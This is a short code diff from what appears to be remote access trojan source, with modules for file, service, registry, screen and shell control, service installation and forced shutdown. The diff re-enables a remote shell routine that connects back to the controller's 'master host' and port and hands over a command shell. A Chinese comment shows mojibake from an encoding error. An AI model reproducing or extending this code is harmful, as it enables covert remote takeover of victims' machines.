@@ -10,7 +10,7 @@
 #include "Plugins\ServiceManager.h"
 #include "Plugins\RegManager.h"
 #include "Plugins\UrlManager.h"
-//#include "Plugins\ShellManager.h"
+#include "Plugins\ShellManager.h"
 
 #include "InstallService.h"
 extern BOOL     bisUnInstall;
@@ -27,15 +27,15 @@ DWORD WINAPI Loop_FileManager(SOCKET sRemote)
 	return 0;
 }
 
-// DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
-// {
-// 	CClientSocket	socketClient;
-// 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
-// 		return -1;
-// 	CShellManager	manager(&socketClient);
-// 	socketClient.run_event_loop();
-// 	return 0;
-// }
+DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+	CShellManager	manager(&socketClient);
+	socketClient.run_event_loop();
+	return 0;
+}
 
 DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
 {
@@ -167,7 +167,7 @@ void ShutdownWindows( DWORD dwReason )
 	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
 }
 
-//�޸ı�ע ����� bUpGroup == FALSE Ϊ�޸ı�ע TRUE Ϊ�޸ķ���
+//�޸ı�ע �����? bUpGroup == FALSE Ϊ�޸ı�ע TRUE Ϊ�޸ķ���
 void SetHostID(LPCTSTR lpBuffer,BOOL bUpGroup = FALSE)
 {
 	TCHAR strSubKey[MAX_PATH];
